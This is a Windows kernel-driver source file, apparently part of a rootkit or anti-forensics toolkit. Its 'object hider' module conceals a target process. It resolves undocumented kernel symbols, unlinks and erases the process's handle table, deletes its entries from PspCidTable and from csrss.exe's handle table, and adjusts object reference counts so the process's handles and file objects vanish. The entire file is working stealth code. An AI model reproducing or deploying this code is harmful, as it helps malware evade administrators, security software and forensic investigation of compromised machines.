#include "ObjectHider.h"
#include "ObjectHiderPrivateIncludes.h"
#include "SymbolWrapper.h"
#include "AllocationHider.h"
#include "GenericHider.h"
#include "FileHider.h"
#include "WinVerProvider.h"

// include ProcessHider if 64-bit system, because process lock/unlock functions are needed
#ifdef _WIN64
#include "ProcessHider.h"
extern "C"
{
	// this method is defined in ProcHandleTableDerefx64
	BOOLEAN ObDeReferenceProcessHandleTablex64(PEPROCESS pProcess, ULONG uRundownProtectOffset);
};

#endif // _WIN64

// boolean representing status of ObjectHider
static BOOLEAN bIsObjectHiderInitialized = FALSE;

// flag which determines the state of the internal symbols
static BOOLEAN bSymbolsInitialized = FALSE;

// ObGetObjectType returns type of the object given the pointer to object
// this function is available only on Windows 7 and above
// Windows 7 and above Type member of OBJECT_HEADER structure points to an index of object type table!
static OBGETOBJECTTYPE pObGetObjectType = NULL;

// address of ObReferenceProcessHandleTable function
static OBREFERENCEPROCESSHANDLETABLE pObReferenceProcessHandleTable = NULL;

// WATCH FOR _WIN32 STUPIDITY - _WIN32 is always defined, both on 32-bit and 64-bit builds!
#ifndef _WIN64
// address of ObDeReferenceProcessHandleTable function - x64 builds don't have this function
static OBDEREFERENCEPROCESSHANDLETABLE pObDeReferenceProcessHandleTable = NULL;
#endif // _WIN32

// address of ExEnumHandleTable function
static EXENUMHANDLETABLE pExEnumHandleTable = NULL;

// address of ExpLookupHandleTableEntry function
static EXPLOOKUPHANDLETABLEENTRY pExpLookupHandleTableEntry = NULL;

// address of PspCidTable global variable
static PVOID pPspCidTable = NULL;

// offset of HandleTableList inside the HANDLE_TABLE structure
// this member points to the linked list of handle tables for all processes in the system
static ULONG uHTableHandleTableListOffset = -1;

// offset of HandleCount member inside HANDLE_TABLE structure
static ULONG uHTableHandleCountOffset = -1;

// offset of LastFree member inside HANDLE_TABLE structure
// this member is valid for OSes below Vista
static ULONG uHTableLastFreeOffset = -1;

// offset of LastFreeHandleEntry member inside HANDLE_TABLE structure
// this member is valid for OSes above Vista
static ULONG uHTableLastFreeHandleEntryOffset = -1;

// offset of NextFreeTableEntry member inside HANDLE_TABLE structure
static ULONG uHTableEntryNextFreeTableEntryOffset = -1;

// offset of PointerCount inside OBJECT_HEADER
static ULONG uObjHeaderPointerCountOffset = -1;

// offset of HandleCount inside OBJECT_HEADER
static ULONG uObjHeaderHandleCountOffset = -1;

// offset of Type member inside OBJECT_HEADER - this member points to an object type (below Windows 7)
// on Windows 7 and above it contains an index to a internal object type table
static ULONG uObjHeaderTypeOffset = -1;

// offset of Body inside OBJECT_HEADER - pointer to object
static ULONG uObjHeaderBodyOffset = -1;

BOOLEAN OhpEnumProcessHandleTable(IN OUT PSORTED_LIST, IN PEPROCESS, IN PEX_ENUM_HANDLE_CALLBACK, IN PVOID);
BOOLEAN OhpHideHandlesCallback(IN OUT PVOID, IN HANDLE, IN PVOID);
BOOLEAN OhpHideHandlesInCsrssHTableCallback(IN OUT PVOID, IN HANDLE, IN PVOID);
VOID OhpHideHandleTableEntry(IN OUT PSORTED_LIST, IN PVOID, IN PVOID, const IN EXHANDLE);
PVOID OhpObReferenceProcessHandleTable(IN PEPROCESS);
VOID OhpObDeReferenceProcessHandleTable(IN PEPROCESS);
PVOID OhpExpLookupHandleTableEntry(IN PVOID, IN EXHANDLE);
BOOLEAN OhpHideObject(IN OUT PSORTED_LIST, IN PVOID);
POBJECT_TYPE OhpGetObjectType(IN PVOID);

NTSTATUS OhInit(VOID)
{
	KeEnterCriticalRegion();
	if(bIsObjectHiderInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return STATUS_SUCCESS;
	}

	// initialize allocation hider if it has not been initialized
	// IT SHOULD BE INITIALIZED BY THE PROCESS HIDER
	if(!AhIsInitialized())
	{
		AhInit();
	}

	// initialize file hider - needed for hiding file objects
	if(!NT_SUCCESS(FhInit()))
	{
		KdPrint(("[DEBUG] WARNING - File hider not initialized -- file objects won't be hidden...\n"));
	}

	if(	!SymWAddSymbol("ObReferenceProcessHandleTable", -1, -1, -1, -1) ||
#ifndef _WIN64
		!SymWAddSymbol("ObDeReferenceProcessHandleTable", -1, -1, -1, -1) ||
#endif // _WIN32
		!SymWAddSymbol("ExEnumHandleTable", -1, -1, -1, -1) ||
		!SymWAddSymbol("ExpLookupHandleTableEntry", -1, -1, -1, -1) ||
		!SymWAddSymbol("PspCidTable", -1, -1, -1, -1) ||
		!SymWAddSymbol("_HANDLE_TABLE.HandleTableList", -1, -1, -1, -1) ||
		!SymWAddSymbol("_HANDLE_TABLE.HandleCount", -1, -1, -1, -1) ||
		!SymWAddSymbol("_HANDLE_TABLE_ENTRY.NextFreeTableEntry", -1, -1, -1, -1) ||
		!SymWAddSymbol("_OBJECT_HEADER.PointerCount", -1, -1, -1, -1) ||
		!SymWAddSymbol("_OBJECT_HEADER.HandleCount", -1, -1, -1, -1) ||
		!SymWAddSymbol("_OBJECT_HEADER.Body", -1, -1, -1, -1)
	  )
	{
		KdPrint(("[DEBUG] ERROR - Error while adding necessary symbols - object hider INACTIVE!\n"));
		KeLeaveCriticalRegion();
		return STATUS_NOT_FOUND;
	}

	BOOLEAN bRet = TRUE;

	// Windows Vista and above
	if(WinGetMajorVersion() >= 6)
	{
		// Windows 7 and above
		if(WinGetMinorVersion() >= 1)
		{
			bRet &= SymWAddSymbol("ObGetObjectType", -1, -1, -1, -1);
		}
		
		bRet &= SymWAddSymbol("_HANDLE_TABLE.LastFreeHandleEntry", -1, -1, -1, -1);
	}
	// below Vista
	else
	{
		bRet &= SymWAddSymbol("_OBJECT_HEADER.Type", -1, -1, -1, -1) &&
				SymWAddSymbol("_HANDLE_TABLE.LastFree", -1, -1, -1, -1);
	}

	if(!bRet)
	{
		KdPrint(("[DEBUG] ERROR - Error while adding necessary symbols - object hider INACTIVE!\n"));
		KeLeaveCriticalRegion();
		return STATUS_NOT_FOUND;
	}

	bIsObjectHiderInitialized = TRUE;
	KeLeaveCriticalRegion();

	return STATUS_SUCCESS;
}

BOOLEAN OhInitSymbols(VOID)
{
	ASSERTMSG("Cannot get object-related symbols because the ObjectHider is not yet initialized", bIsObjectHiderInitialized == TRUE);

	KeEnterCriticalRegion();
	// first check if symbols have already been initialized
	if(bSymbolsInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return TRUE;
	}

	// initialize symbols of the "sub-engines"
	BOOLEAN bRet = FhInitSymbols();

	// initialize all symbols common for all versions of Windows operating system
	bRet &=	SymWInitializeAddress((PVOID *) &pObReferenceProcessHandleTable, "ObReferenceProcessHandleTable", TRUE) &&
#ifndef _WIN64
			SymWInitializeAddress((PVOID *) &pObDeReferenceProcessHandleTable, "ObDeReferenceProcessHandleTable", TRUE) &&
#endif // _WIN32
			SymWInitializeAddress((PVOID *) &pExEnumHandleTable, "ExEnumHandleTable", TRUE) &&
			SymWInitializeAddress((PVOID *) &pExpLookupHandleTableEntry, "ExpLookupHandleTableEntry", FALSE) &&
			SymWInitializeAddress(&pPspCidTable, "PspCidTable", FALSE) &&
			SymWInitializeOffset(&uHTableHandleTableListOffset, "_HANDLE_TABLE.HandleTableList") &&
			SymWInitializeOffset(&uHTableHandleCountOffset, "_HANDLE_TABLE.HandleCount") &&
			SymWInitializeOffset(&uHTableEntryNextFreeTableEntryOffset, "_HANDLE_TABLE_ENTRY.NextFreeTableEntry") &&
			SymWInitializeOffset(&uObjHeaderPointerCountOffset, "_OBJECT_HEADER.PointerCount") &&
			SymWInitializeOffset(&uObjHeaderHandleCountOffset, "_OBJECT_HEADER.HandleCount") &&
			SymWInitializeOffset(&uObjHeaderBodyOffset, "_OBJECT_HEADER.Body");

	// Windows Vista and above
	if(WinGetMajorVersion() >= 6)
	{
		// Windows 7 and above
		if(WinGetMinorVersion() >= 1)
		{
			bRet &= SymWInitializeAddress((PVOID *) &pObGetObjectType, "ObGetObjectType", TRUE);
		}	

		bRet &= SymWInitializeOffset(&uHTableLastFreeHandleEntryOffset, "_HANDLE_TABLE.LastFreeHandleEntry");
	}
	else
	{
		// previous versions of operating system use Type member inside OBJECT_HEADER and Lastfree inside HANDLE_TABLE
		bRet &= SymWInitializeOffset(&uObjHeaderTypeOffset, "_OBJECT_HEADER.Type") &&
				SymWInitializeOffset(&uHTableLastFreeOffset, "_HANDLE_TABLE.LastFree");
	}

	if(!bRet)
	{
		KdPrint(("[DEBUG] ERROR - Error while initializing offsets or addresses - object hider INACTIVE!\n"));
		KeLeaveCriticalRegion();
		return bRet;
	}

	bSymbolsInitialized = TRUE;
	KeLeaveCriticalRegion();

	return bRet;
}

VOID OhUnInit(VOID)
{
	KeEnterCriticalRegion();
	// check if engine has been initialized
	if(bIsObjectHiderInitialized == FALSE)
	{
		KeLeaveCriticalRegion();
		return;
	}

	// un-initialize all initialized "hiding engines"
	AhUnInit();
	FhUnInit();

	bIsObjectHiderInitialized = FALSE;
	KeLeaveCriticalRegion();
}

BOOLEAN OhHideTargetProcessHandleTable(IN OUT PSORTED_LIST pList, const IN PEPROCESS pTargetProcess)
{
	ASSERTMSG("Cannot hide process handle table because the ObjectHider is not yet initialized", bIsObjectHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid hide list - pointer to hide list cannot be NULL\n"));
		return FALSE;
	}

	if(pTargetProcess == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid process pointer -- pointer cannot be NULL\n"));
		return FALSE;
	}

	// first acquire target process handle table
	PVOID pHandleTable = OhpObReferenceProcessHandleTable(pTargetProcess);
	
	if(pHandleTable == NULL)
	{
		// lock has been released by the kernel function if handle table could not be referenced
		// no need to dereference it explicitly
		KdPrint(("[DEBUG] WARNING - Cannot reference target process handle table -- table cannot be hidden!\n"));
		return FALSE;
	}

	KdPrint(("[DEBUG] Handle table of target process found @ 0x%x... Unlinking from the list and deleting allocation\n", (ULONG_PTR) pHandleTable));

	// modify handle table list links
	GhModifyListFlinkBlinkPointers(pList, pHandleTable, uHTableHandleTableListOffset);

	// find and delete handle table allocation -- allocations have "Obtb" tag (0x6274624f hex)
	BOOLEAN bRet = AhAddAllocation(pList, pHandleTable, 0x6274624f);

	// dereference the table before return
	OhpObDeReferenceProcessHandleTable(pTargetProcess);

	return bRet;
}

BOOLEAN OhHideProcessHandles(IN OUT PSORTED_LIST pList, const IN PEPROCESS pTargetProcess)
{
	ASSERTMSG("Cannot hide process handle table because the ObjectHider is not yet initialized", bIsObjectHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid hide list - pointer to hide list cannot be NULL\n"));
		return FALSE;
	}

	if(pTargetProcess == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid process pointer -- pointer cannot be NULL\n"));
		return FALSE;
	}

	return OhpEnumProcessHandleTable(pList, pTargetProcess, (PEX_ENUM_HANDLE_CALLBACK) OhpHideHandlesCallback, (PVOID) pList);
}

BOOLEAN OhHidePspCidTableHandle(IN OUT PSORTED_LIST pList, const IN HANDLE hTargetPIDorTID, const IN PVOID pObject)
{
	ASSERTMSG("Cannot hide process handle table because the ObjectHider is not yet initialized", bIsObjectHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid hide list - pointer to hide list cannot be NULL\n"));
		return FALSE;
	}

	if(pObject == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid object - pointer to object cannot be NULL\n"));
		return FALSE;
	}

	EXHANDLE ExHandle;

	// map handle to EXHANDLE
	ExHandle.GenericHandleOverlay = hTargetPIDorTID;

	PVOID PspCidHandleTable = (PVOID) *((PULONG_PTR) pPspCidTable);

	// try to get process or thread handle, based on the process ID or thread ID
	PVOID pHandleTableEntry = OhpExpLookupHandleTableEntry(PspCidHandleTable, ExHandle);

	// entry was not found in PspCidTable
	if (pHandleTableEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Object @ 0x%p with ID = %p not found inside PspCidTable!\n", pObject, hTargetPIDorTID));
		return FALSE;
	}

	KdPrint(("[DEBUG] Hiding handle 0x%x from the PspCidTable handle table (0x%p)...\n", hTargetPIDorTID, (ULONG_PTR) PspCidHandleTable));

	OhpHideHandleTableEntry(pList, PspCidHandleTable, pHandleTableEntry, ExHandle);

	return TRUE;
}

BOOLEAN OhHideCsrssProcessHandles(IN OUT PSORTED_LIST pList, const IN PEPROCESS pCsrssProcess, const IN PEPROCESS pTargetProcess)
{
	ASSERTMSG("Cannot hide process handle table because the ObjectHider is not yet initialized", bIsObjectHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid hide list - pointer to hide list cannot be NULL\n"));
		return FALSE;
	}

	if(pCsrssProcess == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid csrss.exe pointer - pointer to process cannot be NULL\n"));
		return FALSE;
	}

	if(pTargetProcess == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid process pointer -- pointer cannot be NULL\n"));
		return FALSE;
	}

	KdPrint(("[DEBUG] Hiding process block (0x%p) from the csrss handle table...\n", pTargetProcess));
	
	// get csrss handle table
	PVOID pHandleTable = OhpObReferenceProcessHandleTable(pCsrssProcess);
	if(pHandleTable == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Cannot reference csrss handle table -- handles inside process cannot be hidden!\n"));
		return FALSE;
	}

	// prepare data for the callback - pass the list and the target process
	CSRSSHTABLEENUM csrssTableStruct;
	csrssTableStruct.pList = pList;
	csrssTableStruct.pTargetProcess = pTargetProcess;
	csrssTableStruct.pHandleTable = pHandleTable;

	// it is theoretically possible for the csrss handle table to become "invalid" or destroyed afterwards, but since the modifications are
	// made "virtually", in the hide list, it is not a critical bug
	OhpObDeReferenceProcessHandleTable(pCsrssProcess);
	
	OhpEnumProcessHandleTable(pList, pCsrssProcess, (PEX_ENUM_HANDLE_CALLBACK) OhpHideHandlesInCsrssHTableCallback, (PVOID) &csrssTableStruct);
	
	return TRUE;
}

BOOLEAN OhpEnumProcessHandleTable(IN OUT PSORTED_LIST pList, IN PEPROCESS pTargetProcess, IN PEX_ENUM_HANDLE_CALLBACK pCallback, IN PVOID pContext)
{
	ASSERTMSG("Pointer to list containing addresses for hiding cannot be NULL!", pList != NULL);
	ASSERTMSG("Pointer to target process cannot be NULL!", pTargetProcess != NULL);
	ASSERTMSG("Pointer to handle enumeration callback cannot be NULL!", pCallback != NULL);
	ASSERTMSG("Handle enumeration context must not be NULL!", pContext != NULL);

	// first acquire target process handle table
	PVOID pHandleTable = OhpObReferenceProcessHandleTable(pTargetProcess);
	if(pHandleTable == NULL)
	{
		// lock has been released by the kernel function if handle table could not be referenced
		// no need to dereference it explicitly
		KdPrint(("[DEBUG] WARNING - Cannot reference target process handle table -- handles inside process cannot be hidden!\n"));
		return FALSE;
	}

	KdPrint(("[DEBUG] Handle table of target process found @ 0x%x... Enumerating process handles\n", (ULONG_PTR) pHandleTable));

	// enumerate process handle table -- must pass sorted list as a context!
	pExEnumHandleTable(pHandleTable, pCallback, pContext, NULL);

	// dereference the table before return
	OhpObDeReferenceProcessHandleTable(pTargetProcess);

	return TRUE;
}

BOOLEAN OhpHideHandlesCallback(IN OUT PVOID pHandleTableEntry, IN HANDLE hObject, IN PVOID pContext)
{
	// context is a sorted list which will contain all addresses that need to be hidden
	ASSERTMSG("Handle enumeration context must not be NULL!", pContext != NULL);

	// not sure if it is possible to get NULL handle table entry, but take this possibility into account
	if(pHandleTableEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Received empty handle table entry... Parsing other handles\n"));
		return FALSE;
	}

	// transform context into list
	PSORTED_LIST pList = (PSORTED_LIST) pContext;

	// first get OBJECT_HEADER from the handle table entry - see Windows Internals pp 153 for more details
	// first member is always the pointer to object
	PVOID pObjectHeader = OHP_GET_OBJ_HEADER(*((PULONG_PTR) pHandleTableEntry));

	// get number of references (both pointer and handle) to the current object
	PULONG puPointerCount = (PULONG) SYMW_MEMBER_FROM_OFFSET(pObjectHeader, uObjHeaderPointerCountOffset, 0);
	PULONG puHandleCount = (PULONG) SYMW_MEMBER_FROM_OFFSET(pObjectHeader, uObjHeaderHandleCountOffset, 0);

	// immediately delete all "exclusive" objects - objects that are referenced by the target process only and
	// have both pointer and handle count equal to 1
	// this objects were opened only once by the target process
	// the comparison below does not take synchronization into account - target process could open another
	// handle to this object during the call!
	if(*puPointerCount == 1 && *puHandleCount == 1)
	{
		PVOID pObject = OHP_OBJ_HEADER_TO_OBJ(pObjectHeader, uObjHeaderBodyOffset);
		OhpHideObject(pList, pObject);
	}
	else
	{
		// if handle and pointer count is not 1, this object is not used exclusively by the process
		// process opened AT LEAST one reference to this object
		// however, it cannot be easily determined if target process opened only one or multiple handles to this object!
		// the safest procedure is to decrement both handle and pointer count
		// IF TARGET PROCESS OPENED THIS OBJECT MULTIPLE TIMES, OBJECTS WON'T BE COMPLETELY HIDDEN!
		GhAddGlobalHideAddress(pList, NULL, (PVOID) puPointerCount, *puPointerCount, *puPointerCount - 1, sizeof(ULONG_PTR), DEC);
		GhAddGlobalHideAddress(pList, NULL, (PVOID) puHandleCount, *puHandleCount, *puHandleCount - 1, sizeof(ULONG_PTR), DEC);
	}

	// delete entire handle table entry, using the specified size
	GhAddRangeForHiding(pList, NULL, pHandleTableEntry, HANDLE_TABLE_ENTRY_SIZE);

	// must return FALSE - this notifies the enumeration routine that the "target" handle has not been found
	// this ensures that all handles in the handle table are properly processed
	return FALSE;
}

BOOLEAN OhpHideHandlesInCsrssHTableCallback(IN OUT PVOID pHandleTableEntry, IN HANDLE hObject, IN PVOID pContext)
{
	// context is a sorted list which will contain all addresses that need to be hidden
	ASSERTMSG("Handle enumeration context is a sorted list which must not be NULL!", pContext != NULL);

	// not sure if it is possible to get NULL handle table entry, but take this possibility into account
	if(pHandleTableEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Received empty handle table entry... Parsing other handles\n"));
		return FALSE;
	}

	// transform context into CSRSSHTABLEENUM structure
	PCSRSSHTABLEENUM pStruct = (PCSRSSHTABLEENUM) pContext;
	PSORTED_LIST pList = pStruct->pList;
	PEPROCESS pTargetProcess = pStruct->pTargetProcess;
	PVOID pHandleTable = pStruct->pHandleTable;

	// get handle table entry object
	PVOID pObjectHeader = OHP_GET_OBJ_HEADER(*((PULONG_PTR) pHandleTableEntry));
	PVOID pObject = OHP_OBJ_HEADER_TO_OBJ(pObjectHeader, uObjHeaderBodyOffset);

	// check if this entry belongs to the target process
	if(pObject == pTargetProcess)
	{
		KdPrint(("[DEBUG] Handle table entry @ 0x%p inside csrss belongs to the target process 0x%p - hiding the entry\n", (ULONG_PTR) pHandleTableEntry, pTargetProcess));

		// "delete" this handle table entry and fix all other related variables
		EXHANDLE ExHandle;
		ExHandle.GenericHandleOverlay = hObject;

		OhpHideHandleTableEntry(pList, pHandleTable, pHandleTableEntry, ExHandle);

		// target entry found - exit the enumeration
		return TRUE;
	}

	// our "target" handle has not been found
	return FALSE;
}

VOID OhpHideHandleTableEntry(IN OUT PSORTED_LIST pList, IN PVOID pHandleTable, IN PVOID pHandleTableEntry, const IN EXHANDLE ExHandle)
{
	ASSERTMSG("Pointer to list containing addresses for hiding cannot be NULL!", pList != NULL);
	ASSERTMSG("Pointer to handle table (of a target process or PspCidTable) cannot be NULL!", pHandleTable != NULL);
	ASSERTMSG("Pointer to handle table entry cannot be NULL!", pHandleTableEntry != NULL);
	
	// object is always the first member in the structure (not object per-se, it contains pointer to object header unioned with the flags)
	PVOID pHandleTableEntryObject = (PVOID) *((PULONG_PTR) pHandleTableEntry);

	// first "hide" the object pointed to by the handle entry
	GhAddReplacementValues(pList, NULL, pHandleTableEntry, (ULONG_PTR) pHandleTableEntryObject, 0, sizeof(ULONG_PTR));

	// decrement the handle count
	PULONG puHandleCount = (PULONG) SYMW_MEMBER_FROM_OFFSET(pHandleTable, uHTableHandleCountOffset, 0);
	GhAddGlobalHideAddress(pList, NULL, (PVOID) puHandleCount, *puHandleCount, *puHandleCount - 1, sizeof(ULONG), DEC);

	ULONG_PTR uNewValue = 0;
	PULONG_PTR puFree = NULL;
	if(WinGetMajorVersion() >= 6)
	{
		puFree = (PULONG_PTR) SYMW_MEMBER_FROM_OFFSET(pHandleTable, uHTableLastFreeHandleEntryOffset, 0);
		// new value contains the pointer to the handle table entry
		uNewValue = (ULONG_PTR) pHandleTableEntry;
	}
	else
	{
		puFree = (PULONG_PTR) SYMW_MEMBER_FROM_OFFSET(pHandleTable, uHTableLastFreeOffset, 0);
		// new value marks free handle
		uNewValue = (ULONG_PTR) ExHandle.Value & ~(sizeof(HANDLE) - 1);
	}

	// set next free entry
	PULONG puNextFreeEntry = (PULONG) SYMW_MEMBER_FROM_OFFSET(pHandleTableEntry, uHTableEntryNextFreeTableEntryOffset, 0);
	GhAddReplacementValues(pList, NULL, (PVOID) puNextFreeEntry, *puNextFreeEntry, *puFree, sizeof(ULONG));

	// set new free -- must use "global" function, since multiple "factors" could influence this variable
	// must make sure that the entry is always properly updated
	GhAddGlobalHideAddress(pList, NULL, (PVOID) puFree, *puFree, uNewValue, sizeof(ULONG_PTR), REP);
}

PVOID OhpObReferenceProcessHandleTable(IN PEPROCESS pTargetProcess)
{
	ASSERTMSG("Pointer to target process cannot be NULL!", pTargetProcess != NULL);

	PVOID pHandleTable = NULL;

	// if OS is Vista, 2008, Windows 7 or above
	if(WinGetMajorVersion() >= 6)
	{
#ifdef _WIN64
		// on x64, only one calling convention is used so we can just call the function (argument will be passed in ECX register)
		pHandleTable = pObReferenceProcessHandleTable(pTargetProcess);
#else // _WIN32
		OBREFERENCEPROCESSHANDLETABLEVISTA pObReferenceProcessHandleTableVista = (OBREFERENCEPROCESSHANDLETABLEVISTA) pObReferenceProcessHandleTable;

		// PEPROCESS is in eax register
		__asm
		{
				push eax
				mov eax, pTargetProcess
				call pObReferenceProcessHandleTableVista
				mov pHandleTable, eax
				pop eax
		}
#endif // _WIN64
	}
	// if OS is XP or lower, we can just call the method directly
	else
	{
		pHandleTable = pObReferenceProcessHandleTable(pTargetProcess);
	}

	return pHandleTable;
}

VOID OhpObDeReferenceProcessHandleTable(IN PEPROCESS pTargetProcess)
{
	ASSERTMSG("Pointer to target process cannot be NULL!", pTargetProcess != NULL);

	// there is no ObDeReferenceProcessHandleTable function on 64-bit systems - using process unlocking (ExReleaseRundownProtection) function exported by the ProcessHider
#ifdef _WIN64
	BOOLEAN bShouldReleaseProtection = ObDeReferenceProcessHandleTablex64(pTargetProcess, 0x178);
	if(bShouldReleaseProtection)
	{
		PhUnlockProcess(pTargetProcess);
	}
#else
	// if OS is Vista, 2008, Windows 7 or above
	if(WinGetMajorVersion() >= 6)
	{
		// on Vista and above, ObDeReferenceProcessHandleTable uses FASTCALL (PEPROCESS in ecx register)
		OBDEREFERENCEPROCESSHANDLETABLEVISTA pObDeReferenceProcessHandleTableVista = (OBDEREFERENCEPROCESSHANDLETABLEVISTA) pObDeReferenceProcessHandleTable;
		pObDeReferenceProcessHandleTableVista(pTargetProcess);
	}
	// if OS is XP or lower, we can just call the method directly
	else
	{
		pObDeReferenceProcessHandleTable(pTargetProcess);
	}
#endif // _WIN64
}

PVOID OhpExpLookupHandleTableEntry(IN PVOID pHandleTable, IN EXHANDLE lookupHandle)
{
	ASSERTMSG("Pointer to handle table cannot be NULL!", pHandleTable != NULL);

	PVOID pTableEntry = NULL;

	// if OS is Vista, 2008, Windows 7 or above
	if(WinGetMajorVersion() >= 6)
	{
		// on Vista and above, ExpLookupHandleTableEntry uses FASTCALL (PHANDLE_TABLE in ECS register)
		EXPLOOKUPHANDLETABLEENTRYVISTA pExpLookupHandleTableEntryVista = (EXPLOOKUPHANDLETABLEENTRYVISTA) pExpLookupHandleTableEntry;
		pTableEntry = pExpLookupHandleTableEntryVista(pHandleTable, lookupHandle);
	}
	// if OS is XP or lower, we can just call the method directly
	else
	{
		pTableEntry = pExpLookupHandleTableEntry(pHandleTable, lookupHandle);
	}

	return pTableEntry;
}

BOOLEAN OhpHideObject(IN OUT PSORTED_LIST pList, IN PVOID pObject)
{
	ASSERTMSG("Pointer to object being deleted must not be NULL", pObject != NULL);
	ASSERTMSG("Pointer to sorted list must not be NULL!", pList != NULL);

	BOOLEAN bRet = TRUE;

	// get object type
	POBJECT_TYPE pObjectType = OhpGetObjectType(pObject);

	// hiding is performed based on the object type
	if(pObjectType == *IoFileObjectType)
	{
		// hide file object
		bRet = FhFindHideAddreses(pList, (PFILE_OBJECT) pObject);
	}

	return bRet;
}

POBJECT_TYPE OhpGetObjectType(IN PVOID pObject)
{
	ASSERTMSG("Pointer to object whose type is being determined must not be NULL", pObject != NULL);

	// if Windows 7 or above, use function
	if(WinGetMajorVersion() >= 6 && WinGetMinorVersion() >= 1)
	{
		// ObGetObjectType function must be initialized
		if(pObGetObjectType != NULL)
		{
			return pObGetObjectType(pObject);
		}
		else
		{
			KdPrint(("[DEBUG] WARNING - Running Windows 7 or above, but no ObGetObjectType function found... Object type could not be resolved\n"));
			return NULL;
		}
	}
	else
	{
		// the Type member inside OBJECT_HEADER points to object type
		PVOID pObjectHeader = OHP_OBJ_TO_OBJ_HEADER(pObject, uObjHeaderBodyOffset);
		return (POBJECT_TYPE) ((PVOID) *((PULONG_PTR) SYMW_MEMBER_FROM_OFFSET(pObjectHeader, uObjHeaderTypeOffset, 0)));
	}
}